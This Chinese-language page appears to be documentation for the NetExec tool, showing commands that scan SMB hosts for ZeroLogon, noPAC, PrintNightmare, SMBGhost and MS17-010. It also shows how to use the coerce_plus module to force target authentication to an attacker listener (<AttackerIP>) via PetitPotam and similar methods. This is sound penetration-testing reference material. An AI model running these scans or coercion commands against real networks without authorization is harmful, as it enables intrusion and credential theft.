---
description: 检查主机是否存在漏洞
---

# 扫描漏洞

## 扫描漏洞

当你开始内部渗透测试时，这些是你应该首先尝试的模块：

#### ZeroLogon

```
nxc smb <ip> -u '' -p '' -M zerologon
```

#### noPAC

```
nxc smb <ip> -u 'user' -p 'pass' -M nopac
```

{% hint style="warning" %}
noPAC 漏洞检查需要凭证。
{% endhint %}

#### PrintNightmare

```
nxc smb <ip> -u '' -p '' -M printnightmare
```

#### SMBGhost

```
nxc smb <ip> -u '' -p '' -M smbghost
```

#### MS17-010（未在实验环境外测试）

```
nxc smb <ip> -u '' -p '' -M ms17-010
```

或者，一次性尝试所有模块！只需列出每个模块：`-M zerologon -M printnightmare`

## 扫描强制认证漏洞

你可以使用 coerce_plus 模块检查强制认证漏洞，如 PetitPotam、DFSCoerce、PrinterBug、MSEven 和 ShadowCoerce。你也可以使用凭证来检查这些漏洞。默认情况下，LISTENER ip 将设置为 localhost，因此网络上不会出现流量。

```
nxc smb <ip> -u '' -p '' -M coerce_plus
```

如果发现漏洞，你可以设置 LISTENER ip 来强制连接。

```
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
```

要一次性运行所有利用方法，添加 ALWAYS=true 选项，否则如果底层 RPC 连接报告成功强制认证，它将停止。

```
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
```

你也可以通过指定方法来检查特定的强制认证方法：

```
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

{% hint style="success" %}
除了使用 `METHOD` 选项，你还可以使用其简写形式 `M`。同样，参数 `LISTENER` 可以缩写为 `L`。

这也适用于指定方法时的漏洞名称。

M=p // 无效，因为 petitpotam 和 printerbug 都以 'p' 开头，所以模块会报错

M=pr // 匹配 printerbug

M=pe // 匹配 petitpotam

M=dfs // 匹配 dfscoerce
{% endhint %}

通过 `nxc <protocol> -L` 查看还有哪些可用模块
